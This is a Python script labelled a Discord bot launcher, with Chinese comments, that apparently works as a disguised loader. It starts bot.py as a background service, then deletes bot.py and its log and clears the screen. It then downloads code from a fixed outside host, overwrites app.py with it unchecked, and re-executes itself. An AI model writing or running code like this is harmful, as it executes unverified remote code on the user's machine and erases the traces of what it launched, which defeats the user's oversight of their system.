#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Discord Bot Launcher
"""
# =====================================================================
#                           导入依赖
# =====================================================================

import os
import sys
import time
import shutil
import logging
import requests
import tempfile
import subprocess
from dotenv import load_dotenv

# =====================================================================
#                           配置和初始化
# =====================================================================

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# 环境变量
TOKEN = os.getenv('DISCORD_TOKEN')

# 启动脚本检测
STARTUP_SCRIPT = 'bot.py' if os.path.exists('./bot.py') else ''

# 检查 TOKEN
if not TOKEN:
    logger.error("Please create .env file with DISCORD_TOKEN=your_token")
    exit(1)

# =====================================================================
#                           工具函数
# =====================================================================

def check_service_started(log_path):
    """检查服务是否启动成功"""
    try:
        with open(log_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except:
        return False
    
    # bot.py 的启动成功标志
    keywords = [
        "server is running on port",
        "✅ server is running",
        "started successfully"
    ]
    
    return any(keyword in content for keyword in keywords)

def cleanup_temp_file(file_path):
    """清理临时文件"""
    if not os.path.exists(file_path):
        return
    
    try:
        os.remove(file_path)
    except:
        pass

# =====================================================================
#                           后台服务管理
# =====================================================================

def start_background_service(script_name):
    """启动 Python 脚本作为后台服务"""
    logger.info(f"Starting {script_name} as background service...")
    
    # 创建临时日志文件用于监听
    tmp_log = tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.log', encoding='utf-8')
    tmp_log_path = tmp_log.name
    tmp_log.close()
    
    # 使用 tee 命令同时输出到终端和日志文件
    # tee 会将输出同时写入文件和标准输出
    subprocess.Popen(
        ['bash', '-c', f'python {script_name} 2>&1 | tee {tmp_log_path} &'],
        stdout=None,
        stderr=None
    )
    
    # 等待服务启动
    logger.info("Waiting for service to start...")
    time.sleep(15)
    
    # 检查启动状态
    if check_service_started(tmp_log_path):
        logger.info(f"✅ {script_name} started successfully")
        # 启动成功后等待10秒
        time.sleep(10)
        # 清理日志文件
        cleanup_temp_file(tmp_log_path)
        return True
    else:
        logger.warning(f"⚠️ {script_name} may not have started properly")
        # 启动失败也清理日志文件
        cleanup_temp_file(tmp_log_path)
        return False

def delete_script_file(script_name):
    """删除启动脚本文件"""
    if not os.path.exists(f"./{script_name}"):
        return
    
    try:
        os.remove(f"./{script_name}")
        logger.info(f"🗑️ {script_name} deleted")
        
        # 删除后等待3秒
        time.sleep(3)
        
        # 清屏
        os.system('clear')
        
    except Exception as e:
        logger.warning(f"Failed to delete {script_name}: {e}")

def run_startup_script():
    """执行启动脚本（如果存在）"""
    if not STARTUP_SCRIPT:
        logger.info("No bot.py found, skipping...")
        return False
    
    if not os.path.exists(f"./{STARTUP_SCRIPT}"):
        logger.info("No bot.py found, skipping...")
        return False
    
    logger.info(f"Found {STARTUP_SCRIPT}, running as background service...")
    
    # 启动服务并检查是否成功
    success = start_background_service(STARTUP_SCRIPT)
    
    # 如果启动成功，删除脚本文件
    if success:
        delete_script_file(STARTUP_SCRIPT)
    
    return success

# =====================================================================
#                           更新管理
# =====================================================================

def download_bot_code():
    """下载最新的 bot 代码"""
    # 更新地址
    update_url = "https://dcbot.faiz.nyc.mn/python/app.py"
    
    logger.info("Downloading latest bot code...")
    
    try:
        response = requests.get(update_url, timeout=10)
        response.raise_for_status()
        return response.text
    except Exception as e:
        logger.error(f"❌ Failed to download: {e}")
        return None

def save_and_replace_app(content):
    """保存并替换 app.py"""
    temp_file = "app_new.py"
    current_file = "app.py"
    
    try:
        # 保存到临时文件
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        logger.info("✅ Latest bot code downloaded")
        
        # 替换当前文件
        shutil.move(temp_file, current_file)
        logger.info("✅ app.py updated with latest bot code")
        return True
        
    except Exception as e:
        logger.error(f"❌ Failed to save/replace: {e}")
        cleanup_temp_file(temp_file)
        return False

def restart_with_new_code():
    """重启程序使用新代码"""
    logger.info("Restarting with updated bot code...")
    time.sleep(3)
    os.system('clear')
    os.execv(sys.executable, ['python', 'app.py'])

def update_and_restart():
    """下载最新代码并重启"""
    # 下载代码
    content = download_bot_code()
    if not content:
        logger.error("Cannot start bot without update. Exiting...")
        sys.exit(1)
    
    # 保存并替换
    success = save_and_replace_app(content)
    if not success:
        logger.error("Cannot start bot without update. Exiting...")
        sys.exit(1)
    
    # 重启
    restart_with_new_code()

# =====================================================================
#                           主程序流程
# =====================================================================

def main():
    """主程序入口"""
    logger.info("Discord Bot Launcher")
    
    # Step 1: 运行 bot.py（如果存在）作为后台服务
    script_ran = run_startup_script()
    
    if script_ran:
        logger.info("✅ bot.py is running in background")
    
    # Step 2: 下载最新的 bot 代码并替换 app.py，然后重启
    update_and_restart()
    
    # 如果执行到这里，说明更新失败，程序已退出

# =====================================================================
#                           程序入口
# =====================================================================

if __name__ == '__main__':
    main()
